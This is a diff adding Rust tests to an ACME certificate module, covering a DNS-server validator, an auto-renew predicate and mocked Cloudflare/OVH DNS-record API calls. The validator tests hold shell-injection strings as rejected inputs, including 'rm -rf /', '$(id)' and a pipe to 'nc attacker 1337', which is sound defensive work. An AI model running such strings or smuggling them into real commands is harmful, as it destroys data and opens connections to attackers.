@@ -23,7 +23,10 @@ use dashmap::DashMap;
 
 use super::dns01::acme_dns_base_domain;
 use super::dns01_manual::PENDING_DNS_MAX_AGE;
-use super::dns_challengers::{build_dns_challenger, DnsChallengeConfig, OvhDnsChallenger};
+use super::dns_challengers::{
+    build_dns_challenger, CloudflareDnsChallenger, DnsChallengeConfig, DnsChallenger,
+    OvhDnsChallenger,
+};
 use super::expiry::check_cert_expiry;
 use super::store::AcmeChallengeStore;
 use super::types::{PendingDnsChallenge, PendingDnsChallenges};
@@ -567,4 +570,423 @@ fn test_ovh_zone_extraction_deep_subdomain() {
     let (zone, sub) = OvhDnsChallenger::extract_zone_and_subdomain("a.b.rwx-g.fr");
     assert_eq!(zone, "rwx-g.fr");
     assert_eq!(sub, "_acme-challenge.a.b");
+}
+
+// --- is_valid_dns_server ---
+//
+// The predicate guards the `@server` argument passed to `dig`
+// inside `check_txt_record`. A lax whitelist here would turn into
+// a shell-injection pivot, so the filter has to reject every
+// meta-character we could imagine. Tests are split per intent so
+// a regression pinpoints the exact bypass.
+
+use super::dns01_manual::is_valid_dns_server;
+
+#[test]
+fn is_valid_dns_server_accepts_ipv4() {
+    assert!(is_valid_dns_server("8.8.8.8"));
+    assert!(is_valid_dns_server("1.1.1.1"));
+    assert!(is_valid_dns_server("192.168.1.1"));
+}
+
+#[test]
+fn is_valid_dns_server_accepts_ipv6_with_brackets() {
+    assert!(is_valid_dns_server("[2001:4860:4860::8888]"));
+    assert!(is_valid_dns_server("[::1]"));
+}
+
+#[test]
+fn is_valid_dns_server_accepts_hostname() {
+    assert!(is_valid_dns_server("ns1.example.com"));
+    assert!(is_valid_dns_server("dns-02.cloudflare.com"));
+}
+
+#[test]
+fn is_valid_dns_server_rejects_empty() {
+    assert!(!is_valid_dns_server(""));
+}
+
+#[test]
+fn is_valid_dns_server_rejects_too_long() {
+    let too_long = "a".repeat(254);
+    assert!(!is_valid_dns_server(&too_long));
+}
+
+#[test]
+fn is_valid_dns_server_rejects_shell_metacharacters() {
+    assert!(!is_valid_dns_server("8.8.8.8; rm -rf /"));
+    assert!(!is_valid_dns_server("`whoami`"));
+    assert!(!is_valid_dns_server("$(id)"));
+    assert!(!is_valid_dns_server("8.8.8.8 && echo pwned"));
+    assert!(!is_valid_dns_server("8.8.8.8|nc attacker 1337"));
+}
+
+#[test]
+fn is_valid_dns_server_rejects_whitespace() {
+    assert!(!is_valid_dns_server("8.8.8.8 "));
+    assert!(!is_valid_dns_server(" 8.8.8.8"));
+    assert!(!is_valid_dns_server("8.8\t8.8"));
+}
+
+#[test]
+fn is_valid_dns_server_rejects_quotes_and_slashes() {
+    assert!(!is_valid_dns_server("'8.8.8.8'"));
+    assert!(!is_valid_dns_server("\"8.8.8.8\""));
+    assert!(!is_valid_dns_server("8.8.8.8/24"));
+    assert!(!is_valid_dns_server("8.8.8.8\\n"));
+}
+
+// --- should_auto_renew ---
+//
+// Pure predicate extracted from the renewal loop so the filtering
+// logic can be tested without spinning a background task or
+// touching the network. Each test pins one of the four rules so
+// a regression says exactly which branch changed.
+
+use super::renewal::should_auto_renew;
+
+fn renewal_cert_fixture(
+    now: chrono::DateTime<chrono::Utc>,
+    days_until_expiry: i64,
+    is_acme: bool,
+    auto_renew: bool,
+    acme_method: Option<&str>,
+) -> lorica_config::models::Certificate {
+    lorica_config::models::Certificate {
+        id: "cert-fixture".into(),
+        domain: "example.com".into(),
+        san_domains: vec![],
+        fingerprint: "deadbeef".into(),
+        cert_pem: "---CERT---".into(),
+        key_pem: "---KEY---".into(),
+        issuer: "Let's Encrypt".into(),
+        not_before: now - chrono::Duration::days(60),
+        not_after: now + chrono::Duration::days(days_until_expiry),
+        is_acme,
+        acme_auto_renew: auto_renew,
+        created_at: now - chrono::Duration::days(60),
+        acme_method: acme_method.map(String::from),
+        acme_dns_provider_id: None,
+    }
+}
+
+#[test]
+fn should_auto_renew_rejects_non_acme() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 5, false, true, None);
+    assert!(!should_auto_renew(&cert, now, 30));
+}
+
+#[test]
+fn should_auto_renew_rejects_opted_out() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 5, true, false, Some("http01"));
+    assert!(!should_auto_renew(&cert, now, 30));
+}
+
+#[test]
+fn should_auto_renew_rejects_dns01_manual() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 5, true, true, Some("dns01-manual"));
+    assert!(
+        !should_auto_renew(&cert, now, 30),
+        "dns01-manual certs must never be auto-renewed, the operator has to confirm the TXT record"
+    );
+}
+
+#[test]
+fn should_auto_renew_accepts_http01_inside_window() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 10, true, true, Some("http01"));
+    assert!(should_auto_renew(&cert, now, 30));
+}
+
+#[test]
+fn should_auto_renew_accepts_dns01_cloudflare_inside_window() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 10, true, true, Some("dns01-cloudflare"));
+    assert!(should_auto_renew(&cert, now, 30));
+}
+
+#[test]
+fn should_auto_renew_accepts_exactly_at_threshold() {
+    let now = chrono::Utc::now();
+    // The cert expires in exactly `threshold_days + 1` hours so
+    // `(not_after - now).num_days()` rounds down to `threshold`.
+    let not_after = now + chrono::Duration::days(30) + chrono::Duration::hours(1);
+    let cert = lorica_config::models::Certificate {
+        id: "cert-edge".into(),
+        domain: "edge.example.com".into(),
+        san_domains: vec![],
+        fingerprint: "ff".into(),
+        cert_pem: "---CERT---".into(),
+        key_pem: "---KEY---".into(),
+        issuer: "Let's Encrypt".into(),
+        not_before: now - chrono::Duration::days(60),
+        not_after,
+        is_acme: true,
+        acme_auto_renew: true,
+        created_at: now - chrono::Duration::days(60),
+        acme_method: Some("http01".into()),
+        acme_dns_provider_id: None,
+    };
+    assert!(
+        should_auto_renew(&cert, now, 30),
+        "cert at exactly the threshold must qualify (predicate is <=, not <)"
+    );
+}
+
+#[test]
+fn should_auto_renew_rejects_outside_window() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 60, true, true, Some("http01"));
+    assert!(!should_auto_renew(&cert, now, 30));
+}
+
+#[test]
+fn should_auto_renew_accepts_already_expired() {
+    let now = chrono::Utc::now();
+    // Negative remaining days must still trigger renewal : an
+    // expired cert is the most urgent renewal case, not a no-op.
+    let cert = renewal_cert_fixture(now, -1, true, true, Some("http01"));
+    assert!(should_auto_renew(&cert, now, 30));
+}
+
+// --- DNS challenger HTTP coverage via wiremock ---
+//
+// These tests replace the provider's API with a local mock server,
+// so the challenger code path (URL shape, auth header, JSON
+// payload, 4xx error mapping) gets exercised without hitting the
+// real Cloudflare / OVH endpoints. Each challenger carries a
+// pub(crate) `with_base_url` constructor that points at the mock
+// origin ; the production constructor plugs in the real base URL.
+
+use wiremock::matchers::{body_json, header, method, path, query_param};
+use wiremock::{Mock, MockServer, ResponseTemplate};
+
+#[tokio::test]
+async fn cloudflare_create_txt_happy_path() {
+    let server = MockServer::start().await;
+    Mock::given(method("POST"))
+        .and(path("/zones/zone123/dns_records"))
+        .and(header("Authorization", "Bearer token456"))
+        .and(header("Content-Type", "application/json"))
+        .and(body_json(serde_json::json!({
+            "type": "TXT",
+            "name": "_acme-challenge.example.com",
+            "content": "value-abc",
+            "ttl": 120,
+        })))
+        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
+            "success": true,
+            "result": {"id": "rec-id-1"},
+        })))
+        .expect(1)
+        .mount(&server)
+        .await;
+
+    let cf =
+        CloudflareDnsChallenger::with_base_url("zone123".into(), "token456".into(), server.uri());
+    cf.create_txt_record("example.com", "value-abc")
+        .await
+        .expect("create should succeed on 200");
+}
+
+#[tokio::test]
+async fn cloudflare_create_txt_surfaces_4xx_with_body() {
+    let server = MockServer::start().await;
+    Mock::given(method("POST"))
+        .and(path("/zones/zone123/dns_records"))
+        .respond_with(ResponseTemplate::new(401).set_body_string(
+            r#"{"success":false,"errors":[{"code":10000,"message":"Authentication error"}]}"#,
+        ))
+        .expect(1)
+        .mount(&server)
+        .await;
+
+    let cf =
+        CloudflareDnsChallenger::with_base_url("zone123".into(), "bad-token".into(), server.uri());
+    let err = cf
+        .create_txt_record("example.com", "val")
+        .await
+        .expect_err("401 must map to Err");
+    assert!(err.contains("401"), "error must carry the status: {err}");
+    assert!(
+        err.contains("Authentication error"),
+        "error must carry the response body for operator diagnostics: {err}"
+    );
+}
+
+#[tokio::test]
+async fn cloudflare_delete_txt_happy_path() {
+    let server = MockServer::start().await;
+
+    // 1. GET to look up the existing record
+    Mock::given(method("GET"))
+        .and(path("/zones/zone123/dns_records"))
+        .and(query_param("type", "TXT"))
+        .and(query_param("name", "_acme-challenge.example.com"))
+        .and(header("Authorization", "Bearer token456"))
+        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
+            "success": true,
+            "result": [{"id": "rec-xyz", "name": "_acme-challenge.example.com"}],
+        })))
+        .expect(1)
+        .mount(&server)
+        .await;
+
+    // 2. DELETE against the resolved record id
+    Mock::given(method("DELETE"))
+        .and(path("/zones/zone123/dns_records/rec-xyz"))
+        .and(header("Authorization", "Bearer token456"))
+        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
+            "success": true,
+            "result": {"id": "rec-xyz"},
+        })))
+        .expect(1)
+        .mount(&server)
+        .await;
+
+    let cf =
+        CloudflareDnsChallenger::with_base_url("zone123".into(), "token456".into(), server.uri());
+    cf.delete_txt_record("example.com")
+        .await
+        .expect("delete should succeed when record exists");
+}
+
+#[tokio::test]
+async fn cloudflare_delete_txt_missing_record_is_err() {
+    let server = MockServer::start().await;
+    Mock::given(method("GET"))
+        .and(path("/zones/zone123/dns_records"))
+        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
+            "success": true,
+            "result": [],
+        })))
+        .expect(1)
+        .mount(&server)
+        .await;
+
+    let cf =
+        CloudflareDnsChallenger::with_base_url("zone123".into(), "token456".into(), server.uri());
+    let err = cf
+        .delete_txt_record("example.com")
+        .await
+        .expect_err("empty GET result should surface as Err, not silent success");
+    assert!(
+        err.contains("not found"),
+        "error should mention the missing record: {err}"
+    );
+}
+
+#[tokio::test]
+async fn ovh_create_txt_happy_path_signs_every_request() {
+    let server = MockServer::start().await;
+
+    // OVH signs each request with a server-provided timestamp.
+    // Three rounds are needed: (1) /auth/time + POST /record for
+    // the create call, (2) /auth/time + POST /refresh for zone
+    // refresh, with get_server_time hit twice.
+    Mock::given(method("GET"))
+        .and(path("/1.0/auth/time"))
+        .respond_with(ResponseTemplate::new(200).set_body_string("1700000000"))
+        .expect(2)
+        .mount(&server)
+        .await;
+
+    Mock::given(method("POST"))
+        .and(path("/1.0/domain/zone/example.com/record"))
+        .and(header("X-Ovh-Application", "app-key"))
+        .and(header("X-Ovh-Consumer", "consumer-key"))
+        .and(body_json(serde_json::json!({
+            "fieldType": "TXT",
+            "subDomain": "_acme-challenge",
+            "target": "challenge-value",
+            "ttl": 60,
+        })))
+        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
+            "id": 42u64,
+            "fieldType": "TXT",
+            "subDomain": "_acme-challenge",
+            "target": "challenge-value",
+            "ttl": 60,
+        })))
+        .expect(1)
+        .mount(&server)
+        .await;
+
+    Mock::given(method("POST"))
+        .and(path("/1.0/domain/zone/example.com/refresh"))
+        .and(header("X-Ovh-Application", "app-key"))
+        .respond_with(ResponseTemplate::new(200).set_body_string(""))
+        .expect(1)
+        .mount(&server)
+        .await;
+
+    let ovh = OvhDnsChallenger::with_base_url(
+        format!("{}/1.0", server.uri()),
+        "app-key".into(),
+        "app-secret".into(),
+        "consumer-key".into(),
+    );
+    ovh.create_txt_record("example.com", "challenge-value")
+        .await
+        .expect("happy-path create must succeed");
+}
+
+#[tokio::test]
+async fn ovh_create_txt_surfaces_4xx_with_body() {
+    let server = MockServer::start().await;
+    Mock::given(method("GET"))
+        .and(path("/1.0/auth/time"))
+        .respond_with(ResponseTemplate::new(200).set_body_string("1700000000"))
+        .mount(&server)
+        .await;
+    Mock::given(method("POST"))
+        .and(path("/1.0/domain/zone/example.com/record"))
+        .respond_with(ResponseTemplate::new(403).set_body_json(serde_json::json!({
+            "class": "Client::Forbidden",
+            "message": "This credential is not valid",
+        })))
+        .expect(1)
+        .mount(&server)
+        .await;
+
+    let ovh = OvhDnsChallenger::with_base_url(
+        format!("{}/1.0", server.uri()),
+        "app-key".into(),
+        "app-secret".into(),
+        "bad-consumer-key".into(),
+    );
+    let err = ovh
+        .create_txt_record("example.com", "val")
+        .await
+        .expect_err("403 must map to Err");
+    assert!(err.contains("403"), "error must carry the status: {err}");
+    assert!(
+        err.contains("credential"),
+        "error must carry the response body: {err}"
+    );
+}
+
+#[tokio::test]
+async fn ovh_delete_without_tracked_record_is_err() {
+    // No mock server needed: the challenger rejects the delete
+    // before sending a request, because the create path was never
+    // called so `created_records` is empty. Pins the "don't silently
+    // succeed on a missing record" contract.
+    let ovh = OvhDnsChallenger::with_base_url(
+        "http://127.0.0.1:1/1.0".into(),
+        "app-key".into(),
+        "app-secret".into(),
+        "consumer-key".into(),
+    );
+    let err = ovh
+        .delete_txt_record("example.com")
+        .await
+        .expect_err("delete without a prior create must return Err");
+    assert!(
+        err.contains("no tracked"),
+        "error should name the missing-id condition: {err}"
+    );
 }
